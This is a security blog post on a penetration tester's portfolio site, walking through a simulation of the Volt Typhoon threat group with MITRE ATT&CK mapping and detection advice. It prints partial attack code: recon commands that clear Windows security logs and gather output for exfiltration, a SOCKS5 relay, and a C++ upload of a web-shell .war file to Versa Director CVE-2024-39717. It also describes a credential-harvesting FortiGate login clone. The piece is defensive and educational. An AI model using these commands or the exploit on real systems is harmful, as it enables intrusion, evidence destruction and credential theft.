<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Portfolio | Nour Alhouseini - Ethical Hacker - Penetration Tester</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
        integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" data-purpose="Layout StyleSheet" title="Web Awesome"
        href="/css/app-wa-3b124ff0e0d7a67cd8c995d0aeb1d15a.css?vsn=d">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/all.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-duotone-solid.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-thin.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-solid.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-regular.css">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-light.css">
    <link rel="shortcut icon" href="./images/Bring-them-back.png" type="image/x-icon">
    <!-- box icons -->
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>

    <!-- custom css -->
    <link rel="stylesheet" href="../../css/style.css">

    <style>
        .code-block {
            background: rgba(10, 10, 20, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 1rem;
            padding: 2rem 2.4rem;
            margin: 1.5rem 0 2rem;
            overflow-x: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.35rem;
            line-height: 1.7;
            color: #c9d1d9;
            white-space: pre;
        }

        .technique-table {
            width: 100%;
            border-collapse: collapse;
            margin: 1.5rem 0 2rem;
            font-size: 1.4rem;
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 1rem;
            overflow: hidden;
        }

        .technique-table th {
            text-align: left;
            padding: 1.2rem 1.6rem;
            background: rgba(10, 10, 20, 0.8);
            color: rgba(255, 255, 255, 0.5);
            font-weight: 600;
            font-size: 1.2rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .technique-table td {
            padding: 1.2rem 1.6rem;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            color: rgba(255, 255, 255, 0.75);
        }

        .technique-table tr:hover td {
            background: rgba(0, 240, 255, 0.03);
        }

        .about-content code {
            font-family: 'JetBrains Mono', monospace;
            background: rgba(10, 10, 20, 0.8);
            padding: 0.2rem 0.6rem;
            border-radius: 0.4rem;
            font-size: 1.4rem;
            color: #00f0ff;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .callout-box {
            border-left: 3px solid #b44aff;
            background: rgba(180, 74, 255, 0.05);
            padding: 2rem 2.4rem;
            border-radius: 0 1rem 1rem 0;
            margin: 2rem 0;
        }

        .section-divider {
            border: none;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.06), transparent);
            margin: 3rem 0;
        }
    </style>
</head>

<body>
    <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>

    <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
    <!-- header design -->
    <header class="header" style="background-color: #1f242df4;">
        <a href="../../index.html" class="logo">Portfolio <sup><i class="fa-classic fa-solid fa-badge-check fa-fw"
                    style="color: #00EEFF;"></i></sup></a>

        <div class='bx bx-menu' id="menu-icon"></div>

        <nav class="navbar">
            <a href="../../index.html#home">&lt;/Home&gt;</a>
            <a href="../../index.html#about">&lt;/About&gt;</a>
            <a href="../../index.html#skills">&lt;/Skills&gt;</a>
            <a href="../../index.html#certificate">&lt;/Education&gt;</a>
            <a href="../../index.html#services">&lt;/Services&gt;</a>
            <a href="../../blogs.html" class="active">&lt;/Blogs&gt;</a>
            <a href="../../index.html#contact">&lt;/Contact&gt;</a>
        </nav>
    </header>

    <!-- blog section -->
    <section class="blog" id="blog">
        <div class="about-img">
            <img src="../../images/Bring-them-back.png" class="machinelogo"
                style="border-radius: 100%; width:20em; height:20em;" alt="Volt Typhoon Simulation">
        </div>

        <div class="about-content">

            <h2 class="heading">Volt <span>Typhoon</span></h2>

            <div class="blog-meta">
                <h3>Origin: China (PRC) — State-Sponsored</h3>
                <p><strong>Aliases:</strong> BRONZE SILHOUETTE, Vanguard Panda, DEV-0391, Insidious Taurus</p>
                <p><strong>Active Since:</strong> Mid-2021 (publicly attributed May 2023)</p>
                <p><strong>Targets:</strong> US Critical Infrastructure — Communications, Energy, Water, Transportation
                </p>
                <p><strong>Focus Areas:</strong> Living off the Land, Pre-positioning, SOHO Device Exploitation</p>
            </div>

            <!-- Overview -->
            <h3><span>Overview</span></h3>
            <p style="font-size: large;">
                FBI Director Christopher Wray called Volt Typhoon "the defining threat of our generation." Unlike
                ransomware groups or data thieves, Volt Typhoon has a single goal: quietly embed themselves inside US
                critical infrastructure networks and wait. No data exfiltration, no ransom notes — just pre-positioned
                access that can be activated during a geopolitical crisis.
            </p>
            <p style="font-size: large;">
                What makes them genuinely different from every other APT is their discipline. They use zero custom
                malware. Every action is performed through built-in operating system tools — <code>cmd.exe</code>,
                <code>wmic</code>, <code>netsh</code>, <code>PowerShell</code>. There are no IOCs to signature on. This
                forced me to fundamentally rethink how detection works when every artifact looks exactly like legitimate
                admin activity.
            </p>

            <hr class="section-divider">

            <h3><span>MITRE ATT&CK Mapping</span></h3>

            <table class="technique-table">
                <thead>
                    <tr>
                        <th>Tactic</th>
                        <th>Technique</th>
                        <th>Simulation Tool</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Initial Access</td>
                        <td>T1190 — Exploit Public-Facing Application (Versa Director CVE-2024-39717)</td>
                        <td>versa_director_exploit.cpp</td>
                    </tr>
                    <tr>
                        <td>Initial Access</td>
                        <td>T1566.002 — Spearphishing Link (FortiGate VPN credential phishing)</td>
                        <td>fortigate_phish/</td>
                    </tr>
                    <tr>
                        <td>Execution</td>
                        <td>T1059.001 — PowerShell (LOTL discovery commands)</td>
                        <td>lotl_discovery.ps1</td>
                    </tr>
                    <tr>
                        <td>Discovery</td>
                        <td>T1082 / T1049 / T1016 — System, Network, and Config Discovery</td>
                        <td>lotl_recon.py</td>
                    </tr>
                    <tr>
                        <td>Command & Control</td>
                        <td>T1090.002 — SOCKS5 Proxy via KV-Botnet</td>
                        <td>kv_botnet_proxy.py</td>
                    </tr>
                    <tr>
                        <td>Defense Evasion</td>
                        <td>T1562.001 — Disable Security Tools (wevtutil log clearing)</td>
                        <td>lotl_recon.py</td>
                    </tr>
                </tbody>
            </table>

            <hr class="section-divider">

            <!-- Living off the Land -->
            <h3><span>Living off the Land: The Recon Module</span></h3>
            <p style="font-size: large;">
                The simulation's recon module calls the exact same binaries a sysadmin would use —
                <code>systeminfo</code>, <code>netstat</code>, <code>ipconfig</code>, <code>wevtutil</code>,
                <code>wmic</code>. There's nothing to detect based on the individual commands. But the <em>pattern</em>
                matters: running systeminfo, then immediately dumping the DNS cache, then querying security products via
                WMI, then clearing specific event logs — that behavioral sequence is what detection has to key on.
            </p>

            <div class="code-block">recon_commands = [
                ("systeminfo", "System information"),
                ("ipconfig /all", "Network configuration"),
                ("netstat -ano", "Active connections"),
                ("net user", "Local user accounts"),
                ("net localgroup administrators", "Admin group members"),
                ("wmic process list brief", "Running processes"),
                ("wmic service list brief", "Installed services"),
                ("netsh advfirewall show allprofiles", "Firewall status"),
                ("wevtutil cl Security", "Clear security logs"), # Defense evasion
                ("wevtutil cl System", "Clear system logs"),
                ]

                for cmd, description in recon_commands:
                result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
                exfil_data[description] = result.stdout[:2000]</div>

            <p style="font-size: large;">
                Building this taught me why behavioral detection (UEBA) is essential for LOTL threats. Traditional SIEM
                rules that alert on individual commands would fire on every sysadmin doing morning checks. You need
                temporal correlation — a rule that triggers when 5+ native discovery commands run in sequence within 60
                seconds from the same session, especially combined with log clearing.
            </p>

            <hr class="section-divider">

            <!-- SOCKS5 Proxy -->
            <h3><span>KV-Botnet: SOCKS5 Proxy Infrastructure</span></h3>
            <p style="font-size: large;">
                Volt Typhoon routes all C2 traffic through compromised SOHO routers — Cisco RV320s, Netgear ProSAFEs,
                DrayTek Vigor devices. They deployed the KV-Botnet, which turns these routers into SOCKS5 proxy nodes.
                The traffic appears to originate from a legitimate small business router, making it nearly impossible to
                block by IP reputation.
            </p>
            <p style="font-size: large;">
                I implemented a full RFC 1928 SOCKS5 proxy to understand how this works at the protocol level. The
                three-phase handshake is straightforward but the details were revealing:
            </p>

            <div class="code-block"># Phase 1: Client greeting — advertise supported auth methods
                # VER (0x05 = SOCKS5) | NMETHODS | METHOD_LIST
                greeting = struct.pack('!BBB', 0x05, 0x01, 0x00) # 1 method: no auth

                # Phase 2: Server selects method
                ver, method = struct.unpack('!BB', response[:2])

                # Phase 3: Connection request
                # VER | CMD | RSV | ATYPE | DST.ADDR | DST.PORT
                ver, cmd, rsv, atype = struct.unpack('!BBBB', header[:4])

                if atype == 0x01: # IPv4 — 4 bytes
                addr = socket.inet_ntoa(self.request.recv(4))
                elif atype == 0x03: # Domain name — variable length
                domain_len = self.request.recv(1)[0]
                addr = self.request.recv(domain_len).decode()
                elif atype == 0x04: # IPv6 — 16 bytes
                addr = socket.inet_ntop(socket.AF_INET6, self.request.recv(16))

                port = struct.unpack('!H', self.request.recv(2))[0]

                # Establish upstream connection and begin bidirectional relay
                remote = socket.create_connection((addr, port))
                self._relay_traffic(self.request, remote)</div>

            <p style="font-size: large;">
                The key insight: when you're a network defender and you see SOCKS5 traffic coming from a legitimate edge
                device, there's nothing inherently suspicious about it. You need to correlate traffic patterns —
                long-lived tunnel sessions with periodic low-volume beaconing — and cross-reference with threat feeds
                tracking known compromised SOHO devices. This is exactly why CISA pushed the "Secure by Design"
                initiative for router manufacturers.
            </p>

            <hr class="section-divider">

            <!-- Versa Director Exploit -->
            <h3><span>Versa Director CVE-2024-39717</span></h3>
            <p style="font-size: large;">
                In mid-2024, Volt Typhoon exploited a zero-day in Versa Director — the management platform used by ISPs
                and MSPs to orchestrate SD-WAN infrastructure. The vulnerability was in an unrestricted file upload
                endpoint in the <code>/vnms/devicereg/uploadFileToDevice</code> path. By uploading a specially crafted
                Java servlet (a <code>.war</code> file containing a web shell), they gained code execution on the
                management server — which controls the entire SD-WAN fabric.
            </p>
            <p style="font-size: large;">
                The C++ exploit simulation crafts the multipart HTTP request, uploads the malicious servlet, and
                interacts with the resulting web shell. What made this attack devastating wasn't the technical
                complexity — it was the target selection. Compromising a Versa Director instance gave them access to
                every downstream network managed through that SD-WAN.
            </p>

            <div class="code-block">// Construct multipart form data for .war file upload
                std::string boundary = "----WebKitFormBoundary" + generate_random(16);
                std::string body = "--" + boundary + "\r\n"
                "Content-Disposition: form-data; name=\"file\"; "
                "filename=\"updates.war\"\r\n"
                "Content-Type: application/octet-stream\r\n\r\n"
                + war_payload + "\r\n--" + boundary + "--\r\n";

                // Upload to unrestricted endpoint
                curl_easy_setopt(curl, CURLOPT_URL,
                "https://target:9183/vnms/devicereg/uploadFileToDevice");
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());</div>

            <hr class="section-divider">

            <!-- FortiGate Phishing -->
            <h3><span>FortiGate VPN Credential Phishing</span></h3>
            <p style="font-size: large;">
                Volt Typhoon also uses targeted credential phishing against network administrators. The simulation
                includes a pixel-perfect clone of the FortiGate SSL-VPN login portal, complete with proper CSS, the
                Fortinet logo, and JavaScript validation. Captured credentials are logged server-side and the victim is
                redirected to the real VPN portal with a "session expired" message — they log in again on the real page
                and never realize anything happened.
            </p>
            <p style="font-size: large;">
                This technique is effective because VPN login pages are inherently expected by users. A typosquat domain
                like <code>vpn-fortinet-corp.com</code> sent from a spoofed IT department email is all it takes. The
                simulation demonstrates why MFA on VPN infrastructure is non-negotiable.
            </p>

            <hr class="section-divider">

            <!-- Detection -->
            <h3><span>Detection Guidance</span></h3>

            <div class="callout-box">
                <p style="font-size: large;"><strong>Key Challenge:</strong> Volt Typhoon generates zero malware
                    artifacts. Detection must be entirely behavioral — command sequence analysis, anomalous SOCKS5
                    tunnels from edge devices, and correlation of admin tool usage with threat intelligence on
                    compromised SOHO infrastructure.</p>
            </div>

            <p style="font-size: large;">
                <strong>What to hunt for:</strong>
            </p>
            <p style="font-size: large;">
                1. Multiple native discovery commands (<code>systeminfo</code>, <code>netstat</code>, <code>wmic</code>)
                executed in rapid succession from a single session<br>
                2. Event log clearing (<code>wevtutil cl</code>) following reconnaissance activity<br>
                3. Long-duration SOCKS5 connections from SOHO devices to internal infrastructure<br>
                4. Unusual inbound connections to SD-WAN management platforms<br>
                5. VPN authentication attempts from IPs associated with residential proxy networks
            </p>

            <p style="font-size: large;">
                Full simulation code available on <a style="color:#5EC6FF" href="https://github.com/0xlumos">GitHub</a>.
            </p>

        </div>
    </section>

    <!-- scroll reveal -->
    <script src="https://unpkg.com/scrollreveal"></script>

    <!-- typed js -->
    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>

    <!-- custom js -->
    <script src="../../js/script.js"></script>
</body>

</html>